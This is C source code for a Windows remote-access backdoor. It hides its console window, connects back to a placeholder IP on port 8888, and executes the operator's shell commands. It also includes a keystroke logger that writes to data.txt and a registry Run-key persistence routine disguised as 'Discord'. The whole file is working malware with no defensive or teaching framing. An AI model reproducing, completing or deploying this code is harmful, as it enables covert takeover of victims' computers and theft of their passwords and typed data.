#define IPADDR "IP"
#define PORT 8888

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

DWORD WINAPI loggerK(){
	int vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";
	FILE *kh;
	char KEY_LOG_FILE[]="data.txt";
	//: making last key state 0
	for(vkey=0;vkey<0xFF;vkey++){
		last_key_state[vkey]=0;
	}

	//: running infinite
	while(1){
		//: take rest for 10 millisecond
		Sleep(10);

		//: get key state of CAPSLOCK,NUMLOCK
		//: and LEFT_SHIFT/RIGHT_SHIFT
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

		//: cheking state of all virtual keys
		for(vkey=0;vkey<0xFF;vkey++){
			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
			showKey=(char)vkey;
			if(isPressed==1 && last_key_state[vkey]==0){

				//: for alphabets
				if(vkey>=0x41 && vkey<=0x5A){
					if(isCAPSLOCK==0){
						if(isL_SHIFT==0 && isR_SHIFT==0){
							showKey=(char)(vkey+0x20);
						}
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=(char)(vkey+0x20);
					}
				}

				//: for num chars
				else if(vkey>=0x30 && vkey<=0x39){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=NUMCHAR[vkey-0x30];
					}
				}

				//: for right side numpad
				else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1){
					showKey=(char)(vkey-0x30);
				}

				//: for printable chars
				else if(vkey>=0xBA && vkey<=0xC0){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vs[vkey-0xBA];
					}
					else{
						showKey=chars_vn[vkey-0xBA];
					}
				}
				else if(vkey>=0xDB && vkey<=0xDF){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vb[vkey-0xDB];
					}
					else{
						showKey=chars_va[vkey-0xDB];
					}
				}

				//: for right side chars ./*-+..
				//: for chars like space,\n,enter etc..
				//: for enter use newline char
				//: don't print other keys
				else if(vkey==0x0D){
					showKey=(char)0x0A;
				}
				else if(vkey>=0x6A && vkey<=0x6F){
					showKey=(char)(vkey-0x40);
				}
				else if(vkey!=0x20 && vkey!=0x09){
					showKey=(char)0x00;
				}

				//:print_and_save_captured_key
				if(showKey!=(char)0x00){
					kh=fopen(KEY_LOG_FILE,"a");
					putc(showKey,kh);
					fclose(kh);
				}
			}
			//: save last state of key
			last_key_state[vkey]=isPressed;
		}


	}//;end_of_while_loop
}//;end_of_main_function

int BackdoorStart()
{
	char err[128] = "Failed\n";
	char suc[128] = "Success\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Discord"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != 0) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}


char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

void Shell() {
	char buffer[1024];
	char container[1024];
	char total_response[18384];


	while (1) {
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			chdir(str_cut(buffer,3,100));
		}
		else if (strncmp("persist", buffer, 7) == 0) {
			BackdoorStart();
		}
		else if (strncmp("whataretheywriting", buffer, 12) == 0) {
			HANDLE thread = CreateThread(NULL, 0,loggerK, NULL, 0, NULL);
			goto jump;
		}
		else if (strncmp("spawn", buffer, 5)==0){
			TCHAR szPath[MAX_PATH];
			DWORD pathLen = 0;

			pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

			ShellExecute(NULL, "open",szPath, NULL, NULL, 0);
			goto jump;
		}
		else {
			FILE *fp;
			fp = _popen(buffer, "r");
			while(fgets(container,1024,fp) != NULL) {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}

	}

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth, 0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = IPADDR;
	ServPort = PORT;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);


	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();
}
